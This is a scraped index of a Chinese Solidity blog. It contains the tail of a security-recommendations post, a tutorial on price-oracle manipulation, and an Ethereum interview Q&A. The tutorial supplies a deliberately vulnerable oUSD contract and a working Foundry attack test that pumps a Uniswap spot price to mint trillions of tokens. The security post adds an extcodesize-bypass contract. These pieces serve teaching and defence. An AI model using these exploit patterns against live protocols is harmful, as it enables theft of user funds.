","date":"2023-01-19","objectID":"/posts/16-safety-recommendations.html:13:0","tags":["solidity"],"title":"Metamask项目方给Solidity程序员的16个安全建议","uri":"/posts/16-safety-recommendations.html"},{"categories":["基础知识"],"content":"时间戳操作 请注意，区块的时间戳可以由矿工操纵。考虑这个合约： uint256 constant private salt = block.timestamp; function random(uint Max) constant private returns (uint256 result){ //get the best seed for randomness uint256 x = salt * 100/Max; uint256 y = salt * block.number/(salt % 5) ; uint256 seed = block.number/3 + (salt % 300) + Last_Payout + y; uint256 h = uint256(block.blockhash(seed)); return uint256((h / x)) % Max + 1; //random number between 1 and Max } 当合约使用时间戳播种一个随机数时，矿工实际上可以在区块被验证后的 15 秒内发布一个时间戳，从而有效地允许矿工预先计算一个更有利于他们中奖机会的选项。时间戳不是随机的，不应在该上下文中使用。 ","date":"2023-01-19","objectID":"/posts/16-safety-recommendations.html:13:1","tags":["solidity"],"title":"Metamask项目方给Solidity程序员的16个安全建议","uri":"/posts/16-safety-recommendations.html"},{"categories":["基础知识"],"content":"13. 15秒规则 黄皮书 （Ethereum 的参考规范）没有规定多少块可以在时间上漂移的限制，但它确实规定每个时间戳应该大于其父时间戳。流行的以太坊协议实现 Geth和Parity都拒绝未来时间戳超过 15 秒的块。因此，评估时间戳使用的一个好的经验法则是：如果您的时间相关事件的规模可以变化 15 秒并保持完整性，那么可以使用block.timestamp. ","date":"2023-01-19","objectID":"/posts/16-safety-recommendations.html:14:0","tags":["solidity"],"title":"Metamask项目方给Solidity程序员的16个安全建议","uri":"/posts/16-safety-recommendations.html"},{"categories":["基础知识"],"content":"避免 block.number 用作时间戳 可以使用 block.number 属性和 平均块时间来估计时间增量，但这不是未来的证据，因为出块时间可能会改变（例如 分叉重组 和 难度炸弹）。但在只持续几天的销售中，15秒规则允许人们获得更可靠的时间估计。 ","date":"2023-01-19","objectID":"/posts/16-safety-recommendations.html:14:1","tags":["solidity"],"title":"Metamask项目方给Solidity程序员的16个安全建议","uri":"/posts/16-safety-recommendations.html"},{"categories":["基础知识"],"content":"14. 多重继承注意事项 在 Solidity 中使用多重继承时，了解编译器如何构成继承图非常重要。 contract Final { uint public a; function Final(uint f) public { a = f; } } contract B is Final { int public fee; function B(uint f) Final(f) public { } function setFee() public { fee = 3; } } contract C is Final { int public fee; function C(uint f) Final(f) public { } function setFee() public { fee = 5; } } contract A is B, C { function A() public B(3) C(5) { setFee(); } } 部署合约时，编译器将从右到左线性化继承（在关键字is之后 ，父项从最基类到最派生列出）。这是合约 A 的线性化： Final \u003c- B \u003c- C \u003c- A 线性化的结果将产生 fee = 5 的值，因为 C 是最接近衍生的合约。这似乎很明显，但想象一下 C 能够隐藏关键函数、重新排序布尔子句并导致开发人员编写可利用的合约的场景。静态分析目前不会引发被遮盖的函数的问题，因此必须手动检查。 为了帮助做出贡献，Solidity 的 Github 有一个包含所有继承相关问题的项目。 ","date":"2023-01-19","objectID":"/posts/16-safety-recommendations.html:15:0","tags":["solidity"],"title":"Metamask项目方给Solidity程序员的16个安全建议","uri":"/posts/16-safety-recommendations.html"},{"categories":["基础知识"],"content":"15. 使用接口类型而不是地址来保证类型安全 当函数将合约地址作为参数时，最好传递接口或合约类型而不是 纯address。因为如果函数在源代码的其他地方被调用，编译器将提供额外的类型安全保证。 在这里，我们看到了两种选择： contract Validator { function validate(uint) external returns(bool); } contract TypeSafeAuction { // good function validateBet(Validator _validator, uint _value) internal returns(bool) { bool valid = _validator.validate(_value); return valid; } } contract TypeUnsafeAuction { // bad function validateBet(address _addr, uint _value) internal returns(bool) { Validator validator = Validator(_addr); bool valid = validator.validate(_value); return valid; } } 可以从下面示例中看出使用TypeSafeAuction合约的好处 。如果 validateBet() 使用 address 参数或合约类型而不是Validator合约类型，编译器将抛出此错误： contract NonValidator{} contract Auction is TypeSafeAuction { NonValidator nonValidator; function bet(uint _value) { bool valid = validateBet(nonValidator, _value); // TypeError: Invalid type for argument in function call. // Invalid implicit conversion from contract NonValidator // to contract Validator requested. } } ","date":"2023-01-19","objectID":"/posts/16-safety-recommendations.html:16:0","tags":["solidity"],"title":"Metamask项目方给Solidity程序员的16个安全建议","uri":"/posts/16-safety-recommendations.html"},{"categories":["基础知识"],"content":"16. 避免 extcodesize 用于检查外部拥有的帐户 以下修饰符（或类似的检查）通常用于验证调用是来自外部拥有的账户（EOA）还是合约账户： // bad modifier isNotContract(address _a) { uint size; assembly { size := extcodesize(_a) } require(size == 0); _; } 这个想法很简单：如果一个地址包含代码，它就不是一个 EOA，而是一个合约账户。但是，合约在构建期间没有可用的源代码。这意味着在构造函数运行时，它可以调用其他合约，但 extcodesize 在它的地址返回零。下面是一个最小的例子，展示了如何绕过这个检查： contract OnlyForEOA { uint public flag; // bad modifier isNotContract(address _a){ uint len; assembly { len := extcodesize(_a) } require(len == 0); _; } function setFlag(uint i) public isNotContract(msg.sender){ flag = i; } } contract FakeEOA { constructor(address _a) public { OnlyForEOA c = OnlyForEOA(_a); c.setFlag(1); } } 因为可以预先计算合约地址，所以如果它检查一个在 block n 处为空，但在block n之后被部署的合约，依然会失败。 警告：这个问题很微妙。如果您的目标是阻止其他合约调用您的合约，那么 extcodesize 检查可能就足够了。另一种方法是检查 的值 (tx.origin == msg.sender)`，尽管这也有缺点。 在其他情况下， extcodesize 可能会为您服务。在这里描述所有这些超出了范围。了解 EVM 的基本行为并使用您的判断。 ","date":"2023-01-19","objectID":"/posts/16-safety-recommendations.html:17:0","tags":["solidity"],"title":"Metamask项目方给Solidity程序员的16个安全建议","uri":"/posts/16-safety-recommendations.html"},{"categories":["合约安全"],"content":" 引言 操纵预言机攻击，并复现了一个攻击示例：用1 ETH兑换17万亿枚稳定币。仅2022年一年，操纵预言机攻击造成用户资产损失超过 2 亿美元。 ","date":"2022-12-22","objectID":"/posts/solidity-smart-contract-security-oracle-manipulation.html:0:0","tags":["solidity","security","oracle"],"title":"合约安全：操纵预言机","uri":"/posts/solidity-smart-contract-security-oracle-manipulation.html"},{"categories":["合约安全"],"content":"1 价格预言机 出于安全性的考虑，以太坊虚拟机（EVM）是一个封闭孤立的沙盒。在EVM上运行的智能合约可以接触链上信息，但无法主动和外界沟通获取链下信息。但是，这类信息对去中心化应用非常重要。 预言机（oracle）可以帮助我们解决这个问题，它从链下数据源获得信息，并将其添加到链上，供智能合约使用。 其中最常用的就是价格预言机（price oracle），它可以指代任何可以让你查询币价的数据源。典型用例： 去中心借贷平台（AAVE）使用它来确定借款人是否已达到清算阈值。 合成资产平台（Synthetix）使用它来确定资产最新价格，并支持 0 滑点交易。 MakerDAO使用它来确定抵押品的价格，并铸造相应的稳定币 $DAI。 ","date":"2022-12-22","objectID":"/posts/solidity-smart-contract-security-oracle-manipulation.html:1:0","tags":["solidity","security","oracle"],"title":"合约安全：操纵预言机","uri":"/posts/solidity-smart-contract-security-oracle-manipulation.html"},{"categories":["合约安全"],"content":"2 预言机漏洞 如果预言机没有被开发者正确使用，会造成很大的安全隐患。 2021年10月，BNB链上的DeFi平台Cream Finance因为预言机漏洞被盗用户资金 1.3亿 美元。 2022年5月，Terra链上的合成资产平台Mirror Protocol因为预言机漏洞被盗用户资金 1.15亿 美元。 2022年10月，Solana链上的去中心化借贷平台Mango Market因为预言机漏洞被盗用户资金 1.15亿 美元。 ","date":"2022-12-22","objectID":"/posts/solidity-smart-contract-security-oracle-manipulation.html:2:0","tags":["solidity","security","oracle"],"title":"合约安全：操纵预言机","uri":"/posts/solidity-smart-contract-security-oracle-manipulation.html"},{"categories":["合约安全"],"content":"2.1 漏洞例子 下面我们学习一个预言机漏洞的例子，oUSD 合约。该合约是一个稳定币合约，符合ERC20标准。类似合成资产平台Synthetix，用户可以在这个合约中零滑点的将 ETH 兑换为 oUSD（Oracle USD）。兑换价格由自定义的价格预言机（getPrice()函数）决定，这里采取的是Uniswap V2的 WETH-BUSD 的瞬时价格。在之后的攻击示例例子中，我们会看到这个预言机非常容易被操纵。 ","date":"2022-12-22","objectID":"/posts/solidity-smart-contract-security-oracle-manipulation.html:2:1","tags":["solidity","security","oracle"],"title":"合约安全：操纵预言机","uri":"/posts/solidity-smart-contract-security-oracle-manipulation.html"},{"categories":["合约安全"],"content":"2.2 漏洞合约 oUSD合约包含7个状态变量，用来记录BUSD，WETH，UniswapV2工厂合约，和WETH-BUSD币对合约的地址。 oUSD合约主要包含3个函数: 构造函数: 初始化 ERC20 代币的名称和代号。 getPrice()：价格预言机，获取Uniswap V2的 WETH-BUSD 的瞬时价格，这也是漏洞所在。 // 获取ETH price function getPrice() public view returns (uint256 price) { // pair 交易对中储备 (uint112 reserve0, uint112 reserve1, ) = pair.getReserves(); // ETH 瞬时价格 price = reserve0/reserve1; } swap()：兑换函数，将 ETH 以预言机给定的价格兑换为 oUSD。 合约代码： contract oUSD is ERC20{ // 主网合约 address public constant FACTORY_V2 = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f; address public constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2; address public constant BUSD = 0x4Fabb145d64652a948d72533023f6E7A623C7C53; IUniswapV2Factory public factory = IUniswapV2Factory(FACTORY_V2); IUniswapV2Pair public pair = IUniswapV2Pair(factory.getPair(WETH, BUSD)); IERC20 public weth = IERC20(WETH); IERC20 public busd = IERC20(BUSD); constructor() ERC20(\"Oracle USD\",\"oUSD\"){} // 获取ETH price function getPrice() public view returns (uint256 price) { // pair 交易对中储备 (uint112 reserve0, uint112 reserve1, ) = pair.getReserves(); // ETH 瞬时价格 price = reserve0/reserve1; } function swap() external payable returns (uint256 amount){ // 获取价格 uint price = getPrice(); // 计算兑换数量 amount = price * msg.value; // 铸造代币 _mint(msg.sender, amount); } } ","date":"2022-12-22","objectID":"/posts/solidity-smart-contract-security-oracle-manipulation.html:2:2","tags":["solidity","security","oracle"],"title":"合约安全：操纵预言机","uri":"/posts/solidity-smart-contract-security-oracle-manipulation.html"},{"categories":["合约安全"],"content":"2.3 攻击思路 我们针对有漏洞的价格预言机 getPrice() 函数进行攻击，步骤： 准备一些 BUSD，可以是自有资金，也可以是闪电贷借款。在实现中，我们利用 Foundry 的 deal cheatcode 在本地网络上给自己铸造了 1_000_000 BUSD 在 UniswapV2 的 WETH-BUSD 池中大量买入 WETH。具体实现见攻击代码的 swapBUSDtoWETH() 函数。 WETH 瞬时价格暴涨，这时我们调用 swap() 函数将 ETH 转换为 oUSD。 可选: 在 UniswapV2 的 WETH-BUSD 池中卖出第2步买入的 WETH，收回本金。 这4步可以在一个交易中完成。 ","date":"2022-12-22","objectID":"/posts/solidity-smart-contract-security-oracle-manipulation.html:2:3","tags":["solidity","security","oracle"],"title":"合约安全：操纵预言机","uri":"/posts/solidity-smart-contract-security-oracle-manipulation.html"},{"categories":["合约安全"],"content":"2.4 Foundry 复现 我们选用 Foundry 进行操纵预言机攻击的复现，因为它很快，并且可以创建主网的本地分叉，方便测试。 在安装好 Foundry 之后，在命令行输入下列命令启动新项目，并安装 openzeppelin 库。 forge init Oracle cd Oracle forge install Openzeppelin/openzeppelin-contracts 在根目录下创建 .env 环境变量文件，并在其中添加主网rpc，用于创建本地测试网。 MAINNET_RPC_URL= https://rpc.ankr.com/eth 将这一讲的代码，Oracle.sol 和 Oracle.t.sol，分别复制到根目录的 src 和 test 文件夹下，然后使用下列命令启动攻击脚本。 forge test -vv --match-test testOracleAttack 我们可以在终端中看到攻击结果。在攻击前，预言机 getPrice() 给出的 ETH 价格为 1216 USD，是正常的。但在我们使用 1,000,000 BUSD 在 UniswapV2 的 WETH-BUSD 池子中买入 WETH 之后，预言机给出的价格被操纵为 17,979,841,782,699 USD。这时，我们可以轻松的用 1 ETH 兑换17万亿枚 oUSD，完成攻击。 Running 1 test for test/Oracle.t.sol:OracleTest [PASS] testOracleAttack() (gas: 356524) Logs: 1. ETH Price (before attack): 1216 2. Swap 1,000,000 BUSD to WETH to manipulate the oracle 3. ETH price (after attack): 17979841782699 4. Minted 1797984178269 oUSD with 1 ETH (after attack) Test result: ok. 1 passed; 0 failed; finished in 262.94ms 攻击代码： // SPDX-License-Identifier: MIT pragma solidity ^0.8.4; import \"forge-std/Test.sol\"; import \"forge-std/console.sol\"; import \"../src/Oracle.sol\"; contract OracleTest is Test { address private constant alice = address(1); address private constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2; address private constant BUSD = 0x4Fabb145d64652a948d72533023f6E7A623C7C53; address private constant ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D; IUniswapV2Router router; IWETH private weth = IWETH(WETH); IBUSD private busd = IBUSD(BUSD); string MAINNET_RPC_URL; oUSD ousd; function setUp() public { MAINNET_RPC_URL = vm.envString(\"MAINNET_RPC_URL\"); // fork指定区块 vm.createSelectFork(MAINNET_RPC_URL,16060405); router = IUniswapV2Router(ROUTER); ousd = new oUSD(); } //forge test --match-test testOracleAttack -vv function testOracleAttack() public { // 攻击预言机 // 0. 操纵预言机之前的价格 uint256 priceBefore = ousd.getPrice(); console.log(\"1. ETH Price (before attack): %s\", priceBefore); // 给自己账户 1000000 BUSD uint busdAmount = 1_000_000 * 10e18; deal(BUSD, alice, busdAmount); // 2. 用busd买weth，推高顺时价格 vm.prank(alice); busd.transfer(address(this), busdAmount); swapBUSDtoWETH(busdAmount, 1); console.log(\"2. Swap 1,000,000 BUSD to WETH to manipulate the oracle\"); // 3. 操纵预言机之后的价格 uint256 priceAfter = ousd.getPrice(); console.log(\"3. ETH price (after attack): %s\", priceAfter); // 4. 铸造oUSD ousd.swap{value: 1 ether}(); console.log(\"4. Minted %s oUSD with 1 ETH (after attack)\", ousd.balanceOf(address(this))/10e18); } // Swap BUSD to WETH function swapBUSDtoWETH(uint amountIn, uint amountOutMin) public returns (uint amountOut) { busd.approve(address(router), amountIn); address[] memory path; path = new address[](2); path[0] = BUSD; path[1] = WETH; uint[] memory amounts = router.swapExactTokensForTokens( amountIn, amountOutMin, path, alice, block.timestamp ); // amounts[0] = BUSD amount, amounts[1] = WETH amount return amounts[1]; } } ","date":"2022-12-22","objectID":"/posts/solidity-smart-contract-security-oracle-manipulation.html:2:4","tags":["solidity","security","oracle"],"title":"合约安全：操纵预言机","uri":"/posts/solidity-smart-contract-security-oracle-manipulation.html"},{"categories":["合约安全"],"content":"3 预防方法 知名区块链安全专家 samczsun 在一篇博客中总结了预言机操纵的预防方法，这里总结一下： 不要使用流动性差的池子做价格预言机。 不要使用现货/瞬时价格做价格预言机，要加入价格延迟，例如时间加权平均价格（TWAP）。 使用去中心化的预言机。 使用多个数据源，每次选取最接近价格中位数的几个作为预言机，避免极端情况。 仔细阅读第三方价格预言机的使用文档及参数设置。 ","date":"2022-12-22","objectID":"/posts/solidity-smart-contract-security-oracle-manipulation.html:3:0","tags":["solidity","security","oracle"],"title":"合约安全：操纵预言机","uri":"/posts/solidity-smart-contract-security-oracle-manipulation.html"},{"categories":["合约安全"],"content":"4 总结 这一讲，我们介绍了操纵预言机攻击，并攻击了一个有漏洞的合成稳定币合约，使用1 ETH兑换了17万亿稳定币，成为了世界首富（并没有）。 ","date":"2022-12-22","objectID":"/posts/solidity-smart-contract-security-oracle-manipulation.html:4:0","tags":["solidity","security","oracle"],"title":"合约安全：操纵预言机","uri":"/posts/solidity-smart-contract-security-oracle-manipulation.html"},{"categories":["基础知识"],"content":"1 以太坊常见问题 在以太坊中，Wei和Ether(以太币)有什么区别？ 答： Wei是以太币的最小面值，就好比说人民币的最小面值是分，英镑的最小面值是便士。 其换算关系为 1 ether = 10^18 wei。 以太坊的平均区块间隔时间是多少？ 答： 平均区块间隔时间为14秒，当然了这只是理论值，你可以在Etherscan（ https://etherscan.io/chart/blocktime ）中查到每日的平均区块时间间隔。 以太坊的平均区块大小是多少？ 答： 区块大小视情况而定，大约是 2KB 。不同于比特币使用区块大小来规定区块的交易量上限，以太坊使用燃料（gas）限制。燃料限制决定了每个区块中处理的交易量、存储/带宽的上限，因为交易和智能合约中函数的执行都要根据指令的复杂度多少来付出相应的燃料，所以使用燃料限制来约束区块大小是可行的。 燃料限制会随网络的波动和矿工的意愿变化，每个矿工都可以选择自己愿意接受的燃料价格。燃料价格就像是比特币中的交易费，只是这里的价格是最小单位燃料的价格，而不是每笔交易的价格。 想要算出一个区块中可以容纳多少笔交易，你不需要清楚地知道燃料的价格，只需知道平均每笔交易使用多少燃料并用整个燃料限制除以它即可。 去年以太猫的发行造成了以太坊网络的大拥堵，整个网络中充斥着大量未被处理的交易。在这种情况下矿工有两种选择。他们可以投票提高燃料限制来处理更多交易，也可以开始提高自己的燃料价格标准并拒绝处理燃料费用过低的交易。 与比特币一样，即使燃料价格很低的交易也可能会被处理加入区块链中，但矿工肯定会先处理完燃料价格高的交易再处理它。如果你的交易并没有那么紧急，设置一个很低的燃料价格也不是不可以，就像我们现实生活中的“花时间来节省金钱”。 如果有恶意用户持续地发起海量交易堵塞网络，全网的交易成本就会越来越高，直到这个恶意用户用完资金或者矿工赚足了交易费并决定扩大网络容量。 以太币是如何产生的？ 答： 2014年以太坊项目以众筹的形式创建并预售了6000万个以太币，除此之外，矿工挖矿也会生成新的以太币。 以太坊中的节点是什么？ 答： 从本质上来说，节点是一台连接到区块链、可以处理交易的计算机。 以太坊都有哪些网络？ 答： 以太坊共有三种类型的网络： 以太坊主链 （就是我们平时用的以太坊）、 以太坊测试网络 （如早期的 Ropsten 和 Rinkeby，最新的 Goerli 和 Sepolia 供开发人员的学习和测试）和 以太坊私有链 （也叫以太坊私有网络，任何人都能用以太坊的代码部署自己的私有链）。 与以太坊网络交互都哪些方法？ 答： 区块链节点、web3.js+智能合约、ethers.js+智能合约、remix+智能合约、ethscan+智能合约、Ethreum JSON RPC API + 智能合约。 你是否能在以太坊中“隐藏”一笔交易？ 答： 不能。以太坊区块链中所有的交易都是公开可见的。 以太坊的交易记录存放在哪里？ 答： 在公共可见的账本中，这个帐本通常被称为区块链。可以通过区块链浏览器进行查询。 以太坊主链已经很强大了，为什么还要使用以太坊私有链？ 答： 原因有很多，主要是因为数据涉及隐私，将数据库去中心化，权限控制和测试。 如何查看一笔交易或一个区块的详细信息？ 答： 你可以使用区块链浏览器，如etherscan.io或live.ether.camp。 如何查看私有链中一笔交易或一个区块的详细信息？ 答： 一些开源的区块链浏览器满足这种需求，如etherparty推出的区块链浏览器（ https://github.com/etherparty/explorer ）。 区块链的共识过程是什么？ 答： 共识是按照特定的协议（如以太坊的协议）验证交易，将交易打包进区块并加入区块链的过程。 以太坊挖矿操作的工作原理是什么呢？ 答： 从原理上说，以太坊中的挖矿操作几乎与比特币相同。 简单地说，就是对于每个包含交易的区块，矿工使用计算机反复且非常快速地试验谜题的答案，直到有一个矿工猜对谜题。 更具体地说，矿工将当前区块唯一的区块头元数据（包括时间戳和软件版本）和一个随机数（nonce value）作为哈希函数的输入，函数将返回一个固定长度、看起来像是由数字和字母随机组成的乱码，叫做哈希值。哈希函数的特性是不同输入对应不同的哈希值，因此矿工仅需改变随机数的值，就会得到一个完全不同的哈希值。 如果算出来的哈希值小于当前的目标值（挖矿难度），则这个矿工就挖出了一个区块，他会获得一些以太币奖励，然后通过向全网络广播该区块，其他节点可以验证该区块中的交易，验证通过后将该区块加入到本地区块链的副本中。也就是说，如果矿工B算出了一个哈希值，矿工A将立刻停止当前区块的哈希值计算，把B挖出的区块加入区块链中并开始新一轮的哈希值计算。 矿工们很难在这场算力竞争中作弊。为了得到迷题的答案，除了一个个试没有更好的办法，也没有伪造这些计算工作的可能，这就是该解谜方法被称为“工作量证明”的原因。 从另一方面来说，用户不需要来验证哈希值是否正确，因为每个节点都已验证过。 一般来说，每12到15秒就会有一个矿工挖出一个新区块。如果矿工解谜的时间开始出现更快或更慢的倾向，算法会自动调整问题的难度，以使矿工解谜的时间稳定在14秒左右。 矿工有一定几率能挖到新区块赚取以太币奖励，他们的赚钱能力取决于运气和他们投入的计算能力。 以太坊使用的工作量证明算法被称为“ethash”，它被设计的需要更多内存，从而增大了使用昂贵的ASIC矿机挖矿的难度，因为ASIC矿机的出现严重压榨了使用其他设备矿工的收益，以至于在比特币中唯一能盈利的挖矿形式就是使用这种定制化的芯片。 从某种意义上来说，ethash可能已经成功实现了这一目标，因为专用的ASIC矿机不能用于挖掘以太坊（至少目前还没有）。 此外，由于以太坊将要从工作量证明挖矿逐步过渡到权益证明挖矿，因而购买ASIC矿机可能不是一个明智的选择，因为一旦以太坊转向权益证明它必将被淘汰。 区块链中最常用的两种共识协议是什么？ 答： 工作量证明（PoW）和权益证明(PoS)，业界也在不断涌现其它新的共识协议。 签署一笔交易需要用到什么工具？ 答： 用户的私钥。 在私钥丢失后，用户是否还可以恢复以太坊帐户？ 答： 是的，用户可以使用12字助记词恢复。 用什么方法可以连接到以太坊节点？ 答： IPC-RPC，JSON-RPC和WS-RPC（RPC指Remote Procedure Call，远程过程调用）。 ","date":"2022-12-20","objectID":"/posts/blockchain-technology-interview-question-and-answer.html:1:0","tags":["基础知识","面试题"],"title":"区块链技术面试题","uri":"/posts/blockchain-technology-interview-question-and-answer.html"},{"categories":["基础知识"],"content":"2 以太坊客户端相关 以太坊中异常火爆的Geth是什么呢？ 答： Geth是以太坊的一个命令行客户端。 连接到Geth客户端的默认方式是什么？ 答： 默认情况下使用IPC-RPC，禁用其他所有的RPC。 Geth客户端中都有哪些API（Application Programming Interface，应用程序编程接口）？ 答： Admin（管理员）、 eth（以太币）、web3、miner（矿工）、net（网络）、personal（个人）、shh、debug（调试）和 txpool（工具）。 你可以使用哪些RPC通过网络连接到Geth客户端？ 答： 你可以使用JSON-RPC或WS-RPC通过网络连接到Geth客户端。 IPC-RPC只能用来连接本地部署的Geth客户端。 如果你输入命令“--rpc”，启用的是哪一个RPC？ 答： JSON-RPC。 默认情况下哪些RPC API是启用的？ 答： eth（以太币）、 web3和net（网络）。 如何为JSON-RPC启用admin api？ 答： 输入命令“–rpcapi”。 命令“--datadir”有什么功能？ 答： 它指定了区块链的存储位置。 Geth的“快速”同步是什么，为什么它更快速呢？ 答： “快速”同步仅下载收款交易所在的区块，并拉取（pull）整个最近状态数据库，而不是像普通同步一样，下载整个区块链的数据并重放所有发生的交易。 命令“--testnet”有什么功能？ 答： 它将客户端连接到以太坊测试网络。 启动Geth客户端会在屏幕上打印大量的输出信息，如果不想被这些繁杂信息干扰该怎么办？ 答： 使用“–verbosity”命令调低输出信息复杂度的值（默认值为3）。 如何使用IPC-RPC连接两个Geth客户端？ 答： 首先启动一个Geth客户端，复制其管道位置（pipe location），然后使用相同的数据文档存储目录（datadir）启动另一个Geth客户端，并使用”–attach”命令传递复制的管道位置。 如何将自定义javascript文件加载到Geth控制台？ 答：输入”–preload”命令和文件的路径即可。 Geth客户端中帐户存储在哪里？ 答：存储在密钥库（keystore）目录中。 如何使用给定的账户发起一笔交易？ 答：首先你要在“ –unlock ”命令中传入帐户地址或索引来解锁账户。然后你需要使用“–password ”命令指定一个此账户的密码文件。 我们刚才说到了有关索引的内容。账户的索引取决于什么？ 答：取决于你添加帐户的顺序。 Geth客户端是否能用来挖矿？ 答：是的，输入“–mine”命令即可。 挖矿选项中的“etherbase”是什么？ 答：这是接受挖矿奖励的帐户地址，该帐户的索引为0。 ","date":"2022-12-20","objectID":"/posts/blockchain-technology-interview-question-and-answer.html:2:0","tags":["基础知识","面试题"],"title":"区块链技术面试题","uri":"/posts/blockchain-technology-interview-question-and-answer.html"},{"categories":["基础知识"],"content":"3 智能合约常见问题 ABI是什么？ 答：简单来说，“ABI”就是低级别的“API”。 ABI（Application Binary Interface）应用程序二进制接口，从本质上讲就是你调用智能合约中的函数并获取它返回值的方式。 ABI中定义了如何调用智能合约中的函数以及应该选用哪种二进制格式将信息从一个程序组件传递到下一个程序组件的详细信息。 以太坊智能合约以字节码的形式部署在以太坊区块链上，一个智能合约中可能会有多个函数。所以说，有了ABI你才可以指定调用智能合约中的哪个函数，才能保证函数的返回值是你期望的格式。 这是一个来自以太坊ABI规范的例子： contract Foo {function bar(real[2] xy) {}function baz(uint32 x, bool y) returns (bool r) { r = x \u003e 32 || y; }function sam(bytes name, bool z, uint[] data) {}} 如果我们想使用参数“69”和“真”调用函数baz（），我们总共会传递68字节的数据，整个过程可以分解为： 0xcdcd77c0：baz（）函数的ID。这是函数baz（uint32，bool）以ASCII形式编码的Keccak-256哈希值的前4个字节。 0x0000000000000000000000000000000000000000000000000000000000000045``` 传入函数baz（）的第一个参数，32位无符号整数69被填充为32个字节（10进制中的69换算成16进制为45）。 ```solidity 0x00000000000000000000000000000000000000000000000000000000000000000001 传入函数baz（）的第二个参数，布尔值真，也就是1，被填充为32个字节。 这68个字节会存放在交易的数据字段（data），需要注意的是，一定要仔细检查交易数据字段中添加的内容，因为在将其传递给智能合约时可能会产生意外的，甚至可能是恶意的副作用。） 为了避免出现生成函数ID时的常见错误，在此过程中必须使用规范的数据类型，就比如说使用标准的256位无符号整型（uint256）而不是无符号整型（uint）。 在Solidity中计算上述sam（）函数ID的的代码如下： bytes4(sha3(\"sam(bytes,bool,uint256[])\") 在这里可以使用诸如web3.js等高级程序库来抽象大部分的细节，不过提供给web3.js的JSON格式ABI是必不可少的。 注意： ABI是一个抽象，它并不是以太坊核心协议的一部分。任何人都可以为自己的智能合约定义专属的ABI，这些智能合约的任何调用者都必须遵守该ABI的规定才能得到有意义的调用结果。但是，对于所有开发人员来说，使用Solidity，Serpent和web3.js更为简单，这些也都符合ABI的规定。 智能合约是什么？ 答：从本质上说，智能合约就是用多种语言编写的计算机代码。智能合约存在于区块链网络上，它们按照自身嵌入的规则执行相关操作，可以看做是参与者之间的契约。 Metamask使用什么节点？ 答：它使用infura.io。 相比于传统以太坊钱包，有哪些功能是Metamask不支持的？ 答：它不支持挖矿和部署智能合约。 智能合约的执行是免费的吗？ 答：不，只能通过执行交易来调用智能合约，而交易需要燃料费用。 查看智能合约的状态是免费的吗？ 答：是的，查询状态不需要执行交易。 谁来执行智能合约？ 答：矿工。 为什么调用智能合约中的函数需要花钱？ 答：除了一些不会改变智能合约状态，除了返回值之外没有其他逻辑的函数之外，调用智能合约中的函数都是需要花钱的。 这笔花费中，除了向智能合约中转入以太币执行调用之外，调用改变智能合约状态的函数需要花费燃料来执行。 为什么以太坊中要引入燃料费用呢？ 答：因为矿工使用自己的计算机（矿机）执行智能合约代码，矿工如果能收回购买机器的成本并获得盈利才能保证整个系统生态的安全性，所以以太坊设计使得矿工可以通过执行调用者请求的代码来赚取燃料费用，从而维持一个健康的生态。 燃料价格是否能决定交易被处理的时间？ 答：是的，也不全是。一般来说，你支付的燃料价格越高，交易越有可能被加入区块链。尽管如此，燃料价格并不能保证交易更快地被处理。 交易中的燃料使用量取决于什么？ 答：燃料使用量取决于存储的用量，指令（操作码）的类型和数量。每一条以太坊虚拟机的操作码都明确规定了所需燃料的数量。 交易费gas该如何计算？ 答：交易费 = 使用的燃料数量 * 燃料价格 （燃料价格由交易者指定）。 如果执行智能合约的花费少于交易者支付的燃料费用，他是否会获得退款？ 答：是的。 如果执行智能合约的花费超过了交易者支付的燃料费用，这时会发生什么？ 答：用户不会获得退款，并且一旦所有燃料耗尽执行就会停止，智能合约的状态就不会改变。 谁来支付调用智能合约的费用？ 答：调用智能合约的用户。 节点在哪里运行智能合约的代码呢？ 答：节点在以太坊虚拟机（EVM）中运行智能合约的代码。以太坊虚拟机规范是以太坊协议的一部分。以太坊虚拟机只是节点运行的一个进程。 以太坊虚拟机需要什么工具来运行智能合约？ 答：它需要智能合约的字节码，它由高级别语言（如Solidity）编译生成。 以太坊虚拟机都包含哪些部分？ 答：内存区域，堆栈和执行引擎。 Remix是什么？ 答：Remix是一个用于开发，测试和部署智能合约的在线工具。它非常适合快速构建和测试轻量级的智能合约，但不适用于复杂的智能合约。 在Remix中，你可以连接哪些节点？ 答：你可以使用Metamask钱包连接到公共节点，使用Geth钱包连接到本地节点以及使用Javascript虚拟机连接到内存中模拟的节点。 什么是DApp，它与普通App有什么不同？ 答：应用程序通常包含一个与某些中心化资源（由组织拥有）交互的客户端，通常有一个与中心化数据层相连的中间层。如果中心化数据层中的数据丢失，则无法（轻松）恢复。 DApp表示去中心化的应用程序。DApp通过智能合约与区块链网络交互，它们使用的数据驻留在智能合约的实例中，与中心化的数据相比，去中心化的数据安全性更高。 ","date":"2022-12-20","objectID":"/posts/blockchain-technology-interview-question-and-answer.html:3:0","tags":["基础知识","面试题"],"title":"区块链技术面试题","uri":"/posts/blockchain-technology-interview-question-and-answer.html"},{"categories":["基础知识"],"content":"4 Solidity常见问题 Solidity是静态类型语言，还是动态类型语言？ 答：Solidity是静态类型语言，这意味着类型在编译阶段是已知的。 Java和Solidity之间存在哪些差异。 答：相比于Java，Solidity支持多继承（multiple inheritance），但不支持方法重载（Overloading）。 在Solidity文件中需要指定的第一个参数是什么？ 答：第一个参数是Solidity编译器的版本，需要指定为^ 0.4.8。不要小看了这一步，因为它可以避免出现在使用其他版本编译器进行编译时引入的不兼容错误。 一个智能合约包含什么？ 答：智能合约主要由状态变量，函数和事件组成。 智能合约中都有哪些类型的函数？ 答：有构造函数（constructor），回退函数（fallback function），常量函数（constant functions）和修改智能合约状态的函数。 如果我将多个智能合约定义放入单个Solidity文件中，会出现什么样的错误？ 答：将多个智能合约定义放入单个Solidity文件中是完全可行的。 两个智能合约可以通过哪些方式进行交互？ 答：一个智能合约可以调用、创建和继承另一个智能合约。 当你尝试部署具有多个智能合约的文件时会发生什么？ 答：编译器只会部署该文件中的最后一个智能合约，也就是说，其他所有智能合约都被忽略了。 如果我有一个庞大的项目，我是否需要将所有相关的智能合约保存在一个文件中？ 答：不需要，你可以使用import语句导入文件。也可以使用HTTP导入文件（甚至是Github上的文件）。 以太坊虚拟机的内存都有哪些部分？ 